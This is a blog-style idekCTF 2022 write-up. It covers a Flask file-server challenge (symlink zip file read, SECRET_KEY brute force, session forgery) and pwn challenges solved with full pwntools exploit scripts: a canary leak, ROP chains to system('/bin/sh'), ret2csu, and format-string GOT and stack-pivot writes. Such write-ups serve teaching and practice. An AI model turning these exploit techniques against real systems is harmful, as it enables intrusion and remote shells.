@@ -1,0 +1,519 @@
+---
+title: "idekCTF 2022 Writeup"
+date: "2023-01-19"
+tags: ['Pwn', 'Web', 'Writeup']
+draft: false
+summary: "idek2022 has provided several challenges with good quality. The `sprintf` challenge is a 'wired' format string challenge in which I have summarized 3 different impressive approaches. Check them out!"
+---
+
+idek2022 has provided several challenges with good quality. The `sprintf` challenge is a "wired" format string challenge in which I have summarized 3 different impressive approaches. Check them out!
+
+
+
+| Category | Challenge          | Comment                               |
+| -------- | ------------------ | ------------------------------------- |
+| Web      | simple file server | file uploading, flask session forgery |
+| Pwn      | Typop              | stack overflow                        |
+|          | sprinf             | a "wired" format string vulnerability |
+
+
+
+### Web
+
+#### simple file server
+
+The challenge involves exploiting a file uploading vulnerability and an flask session forgery.
+
+Our approach involved using the `ln` command to create a soft link and gain access to arbitrary files through the file uploading vulnerability. For instance, we were able to retrieve the content of the `/tmp/server.log` by using the following code snippet.
+
+```
+ln -s /tmp/server.log ./fake.txt
+zip --symlinks -r pwn.zip ./fake.txt
+```
+
+![simpelfileserver-1](/static/images/idekCTF-2022-Writeup/simpelfileserver-1.png)
+
+We then leveraged this information to access the server config file and extract the `app.config["SECRET_KEY"]` used in the express framework. This key is crucial for encrypting session values in the flask application.
+
+![simplefileserver-2](/static/images/idekCTF-2022-Writeup/simplefileserver-2.png)
+
+Upon analyzing the SECRET_KEY generation process, we discovered that it used the server start time as a seed and the random package to generate the key. However, the algorithm used to generate the key is not truly random, as once the seed is determined, the key will always be the same. This enabled us to brute force the last three digits of the server start time, as it only keeps the first three digits after the decimal point.
+
+```
+import random
+import os
+import time
+
+SECRET_OFFSET = 0 # REDACTED
+random.seed(round((time.time() + SECRET_OFFSET) * 1000))
+os.environ["SECRET_KEY"] = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
+
+```
+
+We were able to retrieve the server start time from the log file, which stated that the server application started on 2023-01-13 23:04:17 UTC. Using this information, we wrote a script to brute force the SECRET_KEY.
+
+```
+import random
+import os
+import time
+from dateutil.parser import parse
+from datetime import datetime
+from zoneinfo import ZoneInfo
+
+SECRET_OFFSET = -67198624 # REDACTED
+
+
+for min in range(0, 8):
+    for sec in range(0, 60):
+        server_start_time = datetime(2023,1,13,23,min,sec, tzinfo=ZoneInfo('UTC'))
+        server_start_time_stamp = server_start_time.timestamp()
+
+        for i in range(1000):
+            random.seed(round((server_start_time_stamp + i/1000 + SECRET_OFFSET) * 1000))
+            SECRET_KEY = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
+            print(SECRET_KEY)
+```
+
+Finally, we used a tool called `flask-unsign` to test the generated SECRET_KEYs against the encrypted session value and the plain text. We were able to successfully forge the admin's session and access the `/flag` URL by using the selected SECRET_KEY.
+
+![simplefileserver-4](/static/images/idekCTF-2022-Writeup/simplefileserver-4.png)
+
+![simplefileserver-3](/static/images/idekCTF-2022-Writeup/simplefileserver-3.png)
+
+### Pwn
+
+#### Typop
+
+The Typop challenge is a classic stack overflow problem that has all protection strategies in place. The challenge is named Typop because the `win` function in the program requires three parameters, but there is no gadget to set the `rsi` register in the binary. This means that one needs to leak the glibc library loading address before continuing.
+
+To solve this challenge, the following steps were taken:
+
+1. In the first round, the canary value was leaked through partial writing.
+2. In the second round, the text segment loading offset was leaked through the vulnerable function return address.
+3. In the third round, an ROP chain was constructed to leak the glibc loading address.
+4. Finally, a shell was obtained by using an `system` + `/bin/sh` ROP chain.
+
+```
+def recv_start():
+    sh.recvuntil(b'Do you want to complete a survey?\n')
+    sh.send(b'y\n')
+
+recv_start()
+
+# -----------Leak the canary through partial write --------------#
+sh.recvuntil(b'Do you like ctf?\n')
+sh.send(b'A'*0xB)
+
+payload_start_pos = len('You said: AAAAAAAAAAA')
+canary = int.from_bytes(b'\x00' + sh.recvline()[payload_start_pos:payload_start_pos+7], "little")
+print('[+]\033[32m Wow! We Leak the canary: %s \033[0m' % hex(canary))
+
+sh.recvuntil(b'Aww :( Can you provide some extra feedback?\n')
+## recover the cannary
+sh.send(b'b'*0xA+b'\x00')
+
+recv_start()
+
+# ------------Leak the text segment loading offset (ret address) through particial write ---------#
+sh.recvuntil(b'Do you like ctf?\n')
+sh.send(b'A'*0x12+b'A'*0x8)
+
+payload_start_pos = len('You said: ' + 'A'*0x1A)
+main_addr = int.from_bytes(sh.recvline()[payload_start_pos:-1], "little")
+print('[+]\033[32m Wow! We Leak the ret address(main function): %s \033[0m' % hex(main_addr))
+
+### since the functions are in the same page
+text_seg_offset = main_addr - 0x1447
+win_addr = text_seg_offset + 0x1249
+
+print('[+]\033[32m Wow! We got the win function address: %s \033[0m' % hex(win_addr))
+sh.recvuntil(b'Aww :( Can you provide some extra feedback?\n')
+
+# back to noramal
+sh.send(b'b'*0xA+p64(canary)+b'A'*8+p64(main_addr))
+
+recv_start()
+
+# ------------Leak the glibc version and loaded address for ROP chain ---------------------#
+sh.recvuntil(b'Do you like ctf?\n')
+sh.send(b'A\n')
+sh.recvline()
+sh.recvuntil(b'Aww :( Can you provide some extra feedback?\n')
+
+# leak the glibc version
+pop_rdi_addr = text_seg_offset + 0x14d3
+ret_address = text_seg_offset + 0x101a 
+
+
+elf =  ELF('./chall')
+printf_got_address = elf.got['printf'] + text_seg_offset
+fopen_got_address = elf.got['fopen'] + text_seg_offset
+puts_plt_address = elf.plt['puts'] + text_seg_offset
+
+rop_chain_1 = b'A'*0xA + p64(canary)  + b'A'*0x8 
+rop_chain_1 += p64(ret_address) + p64(pop_rdi_addr) + p64(fopen_got_address) + p64(puts_plt_address) + p64(main_addr)
+sh.send(rop_chain_1)
+print("[*] Payload sended: %s" % rop_chain_1)
+
+fopen_got_address = int.from_bytes(sh.recvline()[:-1].ljust(8,b'\x00'), 'little')
+print('[+]\033[32m Wow! We got the fopen func address: %s \033[0m' % hex(fopen_got_address))
+
+libc = ELF('./libc-2.31.so')
+libc_fopen_addr_s = libc.symbols['fopen']
+libcbase = fopen_got_address - libc_fopen_addr_s
+system_addr = libcbase + libc.symbols['system']
+binsh_addr = libcbase + next(libc.search(b"/bin/sh"))
+
+print('[+]\033[32m Wow! We got the system func address: %s \033[0m' % hex(system_addr))
+print('[+]\033[32m Wow! We got the binsh string address: %s \033[0m' % hex(binsh_addr))
+
+
+recv_start()
+
+# ------------Get the shell!---------------------#
+sh.recvuntil(b'Do you like ctf?\n')
+sh.send(b'A\n')
+
+sh.recvline()
+
+sh.recvuntil(b'Aww :( Can you provide some extra feedback?\n')
+
+rop_chain_2 = b'A'*0xA + p64(canary)  + b'A'*0x8 
+rop_chain_2 += p64(ret_address) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)
+sh.send(rop_chain_2)
+print("[*] Payload sended: %s" % rop_chain_2)
+
+sh.interactive()
+```
+
+The solution to this challenge is complicated and not particularly innovative. We were unable to leverage the provided `win` function as we were unable to find a gadget to set the `rsi` register until we leaked the glibc address and used the gadgets it contained. However, I came across an alternative solution using `ret2csu` in the writeup channel.
+
+**ret2csu**
+
+`ret2csu` is a technique that makes use of two gadgets in the `__libc_csu_init()` function to set the `rbx，rbp，r12，r13，r14，r15, rdx，rsi，edi` registers. Even though the binary is dynamically linked, the `__libc_csu_init()` function is in the text segment and has been appended while compiling, making it usable in the exploit.
+
+![typop-2](/static/images/idekCTF-2022-Writeup/typop-2.png)
+
++ By leveraging the second gadget, we can use stack overflow to construct stack data to control the data of the registers rbx, rbp, r12, r13, r14, and r15. 
++ From the first gadget, we can assign r14 to rdx, assign r13 to rsi, and assign r12d to edi (note that although edi is assigned here, the high 32-bit register value of rdi is actually 0, so we can actually control the value of the rdi register, but we can only control the low 32 bits).
++ In the first gadget, we can control the relationship between rbx and rbp to be rbx+1 = rbp, so we will not execute loc_400600, and then we can continue to execute the following assembly program. Here we can simply set rbx=0, rbp=1.
+
+Here is the script from @giggsterpuku who use this to solve the typop challenge.
+
+```
+# Part 1: Leaking data (canary and rbp in the first payload, function address in the second)
+	r.sendlineafter(b"survey?", b"y")
+	r.sendafter(b"ctf?", b"a"*11)
+	r.recvline()
+	leak = r.recvuntil(b"feedback?\n")
+	canary = b"\x00" + leak[21:28]
+	stack_ptr = int.from_bytes(leak[28:34], 'little') # value in rbp
+	log.info(f"Canary leaked: {canary}")
+	log.info(f"Stack pointer leaked: {hex(stack_ptr)}")
+	r.send(b"a"*10 + canary) # run through another loop of getFeedback() by keeping canary value intact
+	r.sendlineafter(b"survey?", b"y")
+	r.sendafter(b"ctf?", b"a"*26)
+	r.recvline()
+	leak = r.recvuntil(b"feedback?\n")
+	leaked_addr = int.from_bytes(leak[36:42], 'little')
+	log.info(f"Address leaked: {hex(leaked_addr)}; it is from main, offset by 55 bytes")
+	base_addr = leaked_addr - exe.symbols['main'] - 55
+	log.info(f"Calculated base address is: {hex(base_addr)}")
+
+	# Calculate function addresses and r15 register
+	main = p64(base_addr + exe.symbols['main'])
+	win = p64(base_addr + exe.symbols['win'])
+	fini = p64(base_addr + exe.symbols['_fini'])
+	r15 = p64(stack_ptr + 16)
+
+	# Step 2: ret2csu
+	gadget1 = p64(base_addr + pop_regs)
+	r.send(b"a"*10 + canary + b"a"*8 + gadget1 + rbx + b"whatever" + r12d + r13 + r14 + r15 + main)
+	gadget2 = p64(base_addr + param_filler)
+	r.sendlineafter(b"survey?", b"y")
+	r.sendlineafter(b"ctf?", b"yes")
+	r.sendafter(b"feedback?\n", b"a"*2 + win + canary + p64(1) + gadget2 + p64(0)*7)
+	r.interactive()
+```
+
+#### sprintf
+
+The sprintf challenge is an intriguing format string challenge, made even more compelling by the discovery of multiple exploitation methods created by players. I plan to delve deeper into this challenge by first exploring the basics of format string vulnerability, then highlighting the most clever method I've seen, which involves stack pivoting, and finally discussing two other additional potential methods.
+
+**basic of fsb vulnerability**
+
+[This blog](https://axcheron.github.io/exploit-101-format-strings/) is a great introduction for someone who is not familiar with the FSB vulnerability. 
+
+The starting point of exploiting the FSB vulnerability is to find the index of the argument which is controllable in the stack.  
+
+In this challenge, for the statement, `sprintf(buf_addr, buf_addr)`; we could try to input `'%1$pAAAABBBBBBBB'`.
+
+![sprint-3](/static/images/idekCTF-2022-Writeup/sprint-3.png)
+
+This would print the second argument of the `sprintf`.  However, in x64, arguments are usually passed through registers first in the order of `rdi, rsi, rcx, rdx, r8, r9`. So it would print the value of the `rsi` register when calling the `sprintf` function.   However, the address of `vararg` is also our input buffer, meaning it would look up the arguments from our input buffer if there are more than 6 arguments.
+
+Usually, the 7th argument is controllable on the stack, but we still need to make sure of that.
+
++ if I input `%pAAAAAABBBBBBBB`, it will print the address that which `rdi` register(the output addr) contains: `'0x7ffe2853fea0'` or `\x30\x78\x37\x66\x66\x65\x32\x38\x35\x33\x66\x65\x61\x30` in bytes.
++ if I input `%1$pAAAAAABBBBBBBB`, it will print the address that which `rsi `register(the format string addr) contains.
++ if I input `%2$pAAAAAABBBBBBBB`, it will print the address that which `rcx` register contains: `'0x10'`
++ if I input `%3$pAAAAAABBBBBBBB`, it will print the address that which `rdx` register(suggesting where is the left argument list start) contains.
++ ...
++ Then when I input `%5$pAAAAAABBBBBBBB`, it prints `'%5$pAAAA'` or `b'\x25\x31\x24\x70\x41\x41\x41\x41',` meaning it starts looking up the argument from the argument list in the stack.
+
+To understand why the `sprinf` print the output like that, it takes the value at the address 0x7ffe2853fea0 as the 6th argument and prints it according to a provided format specifier. For example, using `p` will print the address, while using `s` will print the content at that address as a string. **Essentially, `sprintf` interprets the values from the argument list on the stack as addresses and prints their contents based on the specified format.**
+
+![sprint-4](/static/images/idekCTF-2022-Writeup/sprint-4.png)
+
+So, for now, we figured out that our input buffer address is considered the 6th argument by the `sprintf` function.
+
+**Bypass the check of n and length**
+
+The function appears to prevent the use of the character 'n' in the input string and limits its length to 0x27, eliminating the potential for fmt address writing and stack overflow. However, the statement `sprintf(buf_addr, buf_addr)` caught my attention. This is where the input fmt buffer and the output buffer are the same. Upon testing, I discovered that `sprintf` prints the output to the buffer while parsing. This allows for the overlapping of the `\x00` character during parsing. For example, if the input is `%4c\x00`, the fmt string parsed by `sprintf` is `%4c`, but it actually outputs `\x20` * 7. This feature can be used to bypass the above mentioned checks.
+
+![sprint-5](/static/images/idekCTF-2022-Writeup/sprint-5.png)
+
+**stack pivoting approach by Ainsetin**
+
+Ainsetin's stack pivoting approach, in my opinion, is the most clever solution to this challenge. It combines fmt arbitrary writing and stack pivoting in the following steps:
+
+1. Create a fake rbp + ret + rop chain in the stack, using the real rbp as the value for the fake rbp.
+2. Overwrite the rbp and ret with the fake ret address on the stack and the address of the 'leave, ret' code. This allows for a second return and jump to our rop chain.
+3. Leak the glibc address from the ROP chain and return to the main function again.
+4. Repeat steps 1-3 and use the system and '/bin/sh' to obtain a shell.
+
+It's important to note that the stack layout should be as follows after `sprintf`:
+
+![](/static/images/idekCTF-2022-Writeup/sprintf-7.png)
+
+Also, padding should be added to prevent overlap of the output string with the following payload `%<num>$hhn`. 
+
+In addition, it's important to keep in mind that `sprintf` resolves all format specifiers as soon as it encounters the first '%' symbol, therefore it will use the stack layout while processing the first '%' symbol. 
+
+Another consideration when exploiting fmt is to carefully select an input buffer address offset that ends with `\x90` so that the 'prev_rbp_address' and the 'fake_rbp_address' differ only in the last byte. The exploit script would be as follows:"
+
+```
+from pwn import *
+from LibcSearcher import *
+from sys import *
+
+# context.log_level='debug'
+context.arch = 'amd64'
+context.endian = 'little'
+remote_host = "sprinter.chal.idek.team"
+remote_port = 1337
+binary_path = "/home/kali/Desktop/idek2022/sprinter/vuln_patched"
+binary = ELF(binary_path)
+Libc = ELF("./libc-2.31.so")
+
+def start():
+    if len(sys.argv) == 2 and sys.argv[1] == 'd':
+        context.terminal = ['tmux','splitw','-h']
+        sh = gdb.debug(binary_path, gdbscript="""
+        b vuln
+        b *0x401291
+        """)
+    elif len(sys.argv) == 2 and sys.argv[1] == 'r':
+        sh = remote(remote_host, remote_port)
+    else:
+        sh = process(binary_path)
+    return sh
+
+
+### Solution: fmt arbitrary writing(sprintf) + stack pivoting
+
+# ------------Get buffer Address--------------#
+### !!! try several times until the buf_address end with 90 so that the value contains in the current rbp address (rbp's rbp) and fake rbp address only different on the last bytes
+while True:
+    sh = start()
+    # sh.recvline()
+    buf_addr = int(sh.recvuntil(':')[len("Enter your string into my buffer, located at"):-1].decode(), 16)
+    print('[+]\033[32m Wow! We got the buffer_addr: %s \033[0m' % hex(buf_addr))
+    if hex(buf_addr)[-2:] == "90":
+        break
+    else:
+        sh.close()
+
+### For the FSB vulnerability, we need to determine from which parameter is the buffer address of our input,
+### i.e. from which parameter is controllable. Usually the 7th but 6th in this case
+
+rbp_address = buf_addr + 0x110
+ret_address = buf_addr + 0x118
+pop_rdi_address = 0x401373
+pop_rsi_address = 0x401371
+printf_got_address = binary.got['printf']
+printf_plt_address = binary.plt['printf']
+# call_printf_address = 0x40121e
+ret_cmd_address = 0x401374
+main_address = binary.sym['main'] # return to vuln_address doesn't work since the stack are overlapped
+
+# we want to overwrite the current ret(0x4012af) to 4012ad
+# and we want to overwrite the current rbp to our fake ret address(rbp-8) (31th param, buf_addr+26*8)
+
+# Notes that the output could overwrite out input, so we need enough padding
+# To calcute the padding size: %46c would generate (46*2-4) * \x20, so the padding length would be the total size we want to write sub 4
+# imagine previous: %44c + '\x00'*padding_length -----> (46*2-4) * \x20 (0x58)
+
+print("rbp: %s, ret: %s" % (hex(rbp_address), hex(ret_address)))
+
+buf = b"%46c" + b'\x00'*(0x58-4)
+buf += b"%29$hhn" # write rbp end with a0 -> 58
+buf += b'A'*(0xAD-0x58) + b'%30$hhn' # write ret end with af -> ad
+buf += b'\x00'* (0xC0-0xAD-14)
+
+buf += p64(rbp_address) # buf_addr + 24*8; 29th param
+buf += p64(ret_address)  # buf_addr + 25*8; 30th param
+buf += p64(pop_rdi_address)
+buf += p64(printf_got_address)
+buf += p64(printf_plt_address)
+buf += p64(ret_cmd_address)
+buf += p64(main_address)
+
+sh.sendline(buf)
+print("[+] payload sent with size %s: %s" % (len(buf),buf)) # the buf size shouldn't large than 0x100
+
+sh.recv(1)
+
+## from bytes address to int
+libc_base = u64(sh.recv(6)+b"\x00\x00") - Libc.sym['printf']
+system_addr = libc_base + Libc.sym['system']
+binsh_addr = libc_base + next(Libc.search(b"/bin/sh\x00"))
+
+print('[+]\033[32m Wow! We got the glibc base: %s \033[0m' % hex(libc_base))
+print('[+]\033[32m Wow! We got the system_addr: %s \033[0m' % hex(system_addr))
+print('[+]\033[32m Wow! We got the binsh_addr: %s \033[0m' % hex(system_addr))
+
+buf_addr = int(sh.recvuntil(': ')[len("Enter your string into my buffer, located at"):-2].decode(), 16)
+print('[+]\033[32m Wow! We got the new buffer_addr: %s \033[0m' % hex(buf_addr))
+
+rbp_address = buf_addr + 0x110
+ret_address = buf_addr + 0x118
+
+buf = b''
+buf += b"%30c" + b'\x00'*(0x38-4)
+buf += b"%30$hhn" # write rbp end with 80 -> 38
+buf += b'A'*(0xAD-0x38) + b'%31$hhn' # write ret end with af -> ad
+buf += b'\x00'* (0xC8-0xAD-14)
+
+buf += p64(rbp_address) # buf_addr + 25*8; 30th param
+buf += p64(ret_address)  # buf_addr + 26*8; 31th param
+buf += p64(ret_cmd_address) # stack alignment
+buf += p64(pop_rdi_address)
+buf += p64(binsh_addr)
+buf += p64(system_addr)
+
+sh.sendline(buf)
+print("[+] payload sent with size %s: %s" % (len(buf),buf)) # the buf size shouldn't large than 0x100
+
+sh.interactive()
+```
+
+**got table rewriting-based approach **
+
+This approach is developed by @Goldenboy.
+
+The GOT table overwriting technique is frequently employed to gain access to the shell. By replacing the function address in the GOT table with the address of the `system`, and providing a string pointer '/bin/sh' as a parameter, the function can be called, and a shell obtained.
+
+The selection of the function to be overwritten is crucial, in this case, `strlen` is the best choice as it only takes a single user-controlled parameter (the buffer), and `system` also takes a single char* argument.
+
+We can use a technique like FSB to write an ROP chain in the stack to leak the Glibc loading address, but we can also brute-force the `system` address in the GOT table as only the middle 12 bits are unknown (the top 40 bits are the same as the `strlen` address and the last 12 bits are fixed as the loading address of Glibc always ends with 0x000). We have a 1/4096 chance of successfully overwriting the correct system address and getting the shell."
+
+```
+def leak_libc(r):
+    r.recvuntil('at 0x')
+    buffer = int(r.recv(12),16)
+    log.info("Buffer: {}".format(hex(buffer)))
+    prefix = "%-10x"+"A"*6+"\x00" + "B"*20 # use the null byte to stop strlen and strchr from detecting the n and length of my payload
+                                           # the %-10x will write \x20(space) to the first 10 bytes
+                                           # this overwrites the null byte while sprintf is still being process
+                                           # this makes it so the %n's are interpreted as format string characters and the writes trigger!
+                                           # the 6 A's place a total of 16 chars in the buffer, which is important for the writes, if you look below the first byte written in 0x10 
+                                           # the B's give padding so the %n's are not overwritten
+    
+    # manually write the format string to write bytes byte by byte for the rop. see above comment for the completed chain
+    # have to be cognecent of the padding, and that it doesn't overwrite the ROP chain, which is why it goes byte by byte 
+    prefix += "%23$hhn%24$hhnA%25$hhnAA%26$hhn%27$hhn%5x%28$n%40x%29$n%30$hhn%31$n%32$n%49x%33$hhnAA%34$hhn%97x%35$hhn"
+
+    # addresses to write to in order
+    suffix =  p64(buffer+0x141) #10
+    suffix += p64(buffer+0x148) #10 
+    suffix += p64(buffer+0x149) #11 
+    suffix += p64(buffer+0x119) #13
+    suffix += p64(buffer+0x131) #13
+    suffix += p64(buffer+0x138) #18 
+    suffix += p64(buffer+0x132) #40 needs n 
+    suffix += p64(buffer+0x139) #40 
+    suffix += p64(buffer+0x13a) #40 needs n
+    suffix += p64(buffer+0x142) #40 needs n
+    suffix += p64(buffer+0x118) #71 
+    suffix += p64(buffer+0x130) #73
+    suffix += p64(buffer+0x140) #d4
+    #g(r,buffer) #uncomment to check the out the rop chain!
+    payload = prefix + "\x00"*(248 - (len(prefix)+len(suffix)))+  suffix # pad and create payload
+    send_msg(r,payload)
+    libc = u64(r.recv(6) + "\x00\x00")-strlen_libc  #parse libc leak
+    return buffer,libc
+
+def overwrite_got(r,libc_base):
+    r.recvuntil('at 0x')
+    buffer = int(r.recv(12),16)
+    log.info("NEW Buffer: {}".format(hex(buffer)))
+
+
+    to_write = hex(libc_base+system_libc) # calc the address we want to write, cast to a hex-string which is how I like to grab specific bytes 
+    byte1 = 0x90
+    byte2 = int(to_write[-4:-2],16) # grab the 2nd least significant byte
+    byte3 = int(to_write[-6:-4],16) # grab the 3rd least significant byte
+    bytesl = [(byte1,1),(byte2,2),(byte3,3)] #create a list of bytes and their position
+    bytesl.sort() #sort based on size, so I can pad in the correct order
+
+
+    prefix = "%-10x"+"A"*6+"\x00" + "B"*20 # same start, if it ain't broke don't fix it
+    prefix += "%31$hhnA%32$hhn" #writes for the return address, since these are small 0x10 and 0x11
+
+    #generate the rest of the chain using the pre calculated array 
+    count = 17 # manual writes end at 0x11 or 17
+    for byte in bytesl:
+        prefix += "%{}x%{}$hhn".format(byte[0]-count,36-byte[1])
+        count = byte[0]
+
+    log.info("format string chain: {}".format(prefix))
+    
+    # addresses to write to
+    suffix =  p64(buffer+0x118) #10
+    suffix += p64(buffer+0x119) #11
+    suffix += p64(strlen_got+2) #unknown
+    suffix += p64(strlen_got+1) #unknown
+    suffix += p64(strlen_got) #90
+    
+    payload = prefix + "\x00"*(248 - (len(prefix)+len(suffix)))+  suffix
+    #g2(r,buffer) #uncomment to view the write to plt.got
+    send_msg(r,payload)
+    return
+```
+
+**brute force approach: stack overflow + %s bypass canary + onegadgets addr overwriting**
+
+This approach comes from https://uz56764.tistory.com/83.
+
+The previous methods used `%n` for arbitrary address writing. However, this approach utilizes `%s` for canary bypass and ret address overwrite through stack overflow, which is equally impressive.
+
+```
+payload = f'\x01\x5b\x29%5$261c'.encode()
+payload += f'%4$c'.encode()
+payload += f'%10$.7s'.encode() # bypass canary
+payload += f'%8c'.encode() # rbp
+payload += b'%12$.3s%11$.5s' # ret address (top 5 bytes from __libc_start_main+243 and last 3 bytes from the input buffer)
+payload += b'\x00'*2
+payload += p64(stack+264+1) # argument 10
+payload += p64(stack+264+8*4+3) # argument 11
+payload += p64(stack) # argument 12
+
+print(f'payload = {len(payload)}')
+p.sendline(payload)
+```
+
+Based on the leaked buffer address, the author first prints the canary value by overflowing the buffer using `%10.7s`. The `.7` specifies the width of the string to be printed. Then, it attempts to overwrite the ret address by breaking it down into two parts: the top 5 bytes from `__libc+start_main+243`, which is a glibc address on the stack; the last 3 bytes from the input buffer, which is a valid `onegadget` offset. However, the exact glibc loading address is not known and only the first 40 bytes and the last 12 bits (which is 0 due to page segmentation) can be confirmed. Therefore, the 12 bits in the middle must be brute-forced (in this case: `0x7ffff7___000` vs. real loading address: `0x7ffff7dd5000`).
+
+![sprintf-8](/static/images/idekCTF-2022-Writeup/sprintf-8.png)
+
